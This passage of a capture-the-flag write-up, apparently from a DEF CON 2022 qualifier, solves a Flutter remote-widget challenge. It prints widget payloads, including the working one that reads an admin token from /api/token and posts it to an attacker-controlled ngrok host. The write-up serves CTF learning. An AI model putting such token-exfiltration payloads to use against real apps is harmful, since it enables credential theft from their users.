@@ -1,0 +1,199 @@
+widget root = Container(
+  child: Column(
+    children: [
+      Row(
+        children: [
+          Text( text: 'pewpew' ),
+          Expanded(
+            child: Text(
+              text: data.author.user,
+              style: { color: 4278230474 }
+            )
+          )
+        ]
+      ),
+      Row( 
+        children: [
+          ApiMapper(
+            url: "@example.ngrok.io/json",
+            jsonKey: "a",
+            dataKey: "a",
+            onLoaded: set state.abc = 'abc'
+          )
+        ]
+      )
+    ]
+  )
+);
+```
+
+But after this step, I got stuck again because ApiMapper can only send GET requests, not POST, which can be proven from the source code:
+
+![ApiMapper](/img/defcon-2022-qual-writeup/p4.png)
+
+### 21:30 (3h 50m) Another team solved it
+
+I wanted to get the first blood, but I was outmatched and had to QQ.
+
+At this point, I was still studying the source code, both for the problem and for RFW, to see if I could find more clues.
+
+### 21:43 (4h 03m) Found other key points
+
+Both my teammate and I noticed that there was an `event api_post` in the poll widget that could be used to send POST requests, but we weren't sure how to trigger it.
+
+### 22:22 (4h 42m) Successfully triggered the event
+
+My teammate found a way to trigger it:
+
+``` js
+Row( 
+        children: [
+          ApiMapper(
+            url: "@example.ngrok.io/json",
+            jsonKey: "a",
+            dataKey: "a",
+            onLoaded: event "api_post" {
+              path: "@example.ngrok.io/test",
+              body: "bodytest"
+            }
+          )
+        ]
+      )
+```
+
+I actually tried the same method myself, but for some reason it didn't work.
+
+Although we could send POST requests, we couldn't get a response, so it didn't seem to be useful. I got stuck here for a while.
+
+I felt like we must have missed some important details, otherwise we wouldn't have been stuck here for so long. So I went back and played the app again to see if there was anything we missed.
+
+### 22:56(5h 16m) Back on track, starting to implement exploit
+
+After playing through again, I found that there was a GET API `/api/token` that could retrieve token data, and the data retrieved by ApiMapper would be stored in `data`. Therefore, we can first use ApiMapper to retrieve the data, and then use `event "api_post"` to send the retrieved data to obtain the admin token.
+
+The concept is not difficult, but the implementation is difficult. I spent some time sharing this idea with my teammates, thinking that it would be faster if we wrote it together.
+
+During the process of trying, I found that if the onloaded of ApiMapper is directly connected to `event "api_post"`, it seems that the data cannot be obtained, so I need to find another way. At this time, I thought of the `switch` that appeared in the poll, and I should be able to use that trick.
+
+By the way, the way I learned rfw was to directly look at the code. In fact, the comments and tests were written in detail, and there was much more information than the documentation: https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479
+
+### 23:19(5h 39m) Failed exploit
+
+I wrote a widget that I thought would succeed no matter how I looked at it:
+
+``` js
+widget root { loaded: 1 } = Container(
+  child: Column(
+    children: [
+      Row( 
+        children: [
+          Text(
+            text: "test"
+          ),
+          switch state.loaded {
+            2: ApiMapper(
+              url: "@example.ngrok.io/json",
+              jsonKey: "a",
+              dataKey: "b",
+              onLoaded: event "api_post" {
+                path: "@example.ngrok.io/send",
+                body: {
+                  "token": data.new_token
+                }
+              },
+            ),
+            1: ApiMapper(
+              url: "/api/token",
+              jsonKey: "new_token",
+              dataKey: "new_token",
+              onLoaded: set state.loaded = 2,
+            ),
+            default: Text(
+              text: 'yo'
+            )
+          }
+        ]
+      )
+    ]
+  )
+);
+```
+
+But for some reason, it failed. The second request could not be sent out, so I had to continue trying other methods.
+
+### 23:25(5h 45m) Solved 🎉
+
+Finally, I used this:
+
+``` js
+import core.widgets;
+import core.material;
+import local;
+
+widget root { loaded: 1 } = Container(
+  child: Column(
+    children: [
+      Row( 
+        children: [
+          Text(
+            text: "test"
+          ),
+          ApiMapper(
+            url: "@example.ngrok.io/json",
+            jsonKey: "a",
+            dataKey: "b",
+            onLoaded: event "api_post" {
+              path: "@example.ngrok.io/send",
+              body: {
+                "token": data.new_token
+              }
+            },
+          ),
+          switch state.loaded {
+            1: ApiMapper(
+              url: "/api/token",
+              jsonKey: "new_token",
+              dataKey: "new_token",
+              onLoaded: set state.loaded = 2,
+            ),
+            default: Text(
+              text: 'yo'
+            )
+          }
+        ]
+      )
+    ]
+  )
+);
+```
+
+That switch has no function, and it doesn't matter if it is removed. It's just because I was too lazy to delete it before.
+
+In short, the concept is that we can use two ApiMappers at the same time. The first one is sent to our server and waits for 3 seconds. In this way, when `onLoaded` is triggered, the response that retrieves the token has already returned, so `data.new_token` is the token, and it will be sent to our server.
+
+![token](/img/defcon-2022-qual-writeup/p5.png)
+
+## Summary
+
+Finally, summarize the solution to this problem:
+
+1. Observe the App and find out that custom widgets can be loaded
+2. Learn how to generate a valid widget
+3. Observe the existing remote widgets and find out that there are ApiMapper and api_post
+4. Observe the App and find out that `/api/token` can retrieve the token and get the response
+5. Write a widget that can first use ApiMapper to retrieve the token and then use api_post to send it out
+
+
+This is what I said at the beginning. The difficulty of this problem is not high, and it tests basic skills. What I mean by basic skills is:
+
+1. Observation: You must be able to observe that this problem uses rfw and how the existing mechanisms work, including `/api/token`, `/api/flag`, and the logic of various existing widgets.
+2. Ability to learn new things: You must be able to quickly learn the basic syntax of dart in rfw.
+3. Ability to write code: You must be able to make a working widget and use existing mechanisms to make it work.
+
+The concept of this problem is not difficult, and the time spent is due to being unfamiliar with flutter/dart/rfw, so there are always syntax errors or situations where it just doesn't work.
+
+As for self-reflection, I probably looked in the wrong direction at the beginning and should have observed for a while longer. For example, if you decode the poll widget at the beginning and observe it carefully, you may be able to save a lot of time.
+
+By the way, after following the team to play the qualification round, my biggest realization is that if you want to truly enjoy DEF CON CTF, you still need basic knowledge of binary-related knowledge. I don't think it needs to be very strong, but at least basic knowledge (such as being able to solve very simple pwn and reverse problems in other CTFs?), so that you can know what your teammates are doing and have a sense of participation.
+
+If you don't know anything like me, I think it's a bit of a pity. This feels like, at least you have to play a little bit of LOL, and then you will know what's going on when you watch the game, and you will know which side is good-looking. If you haven't played it, you basically can't understand it, and you won't react even if you see a player using a powerful ultimate.
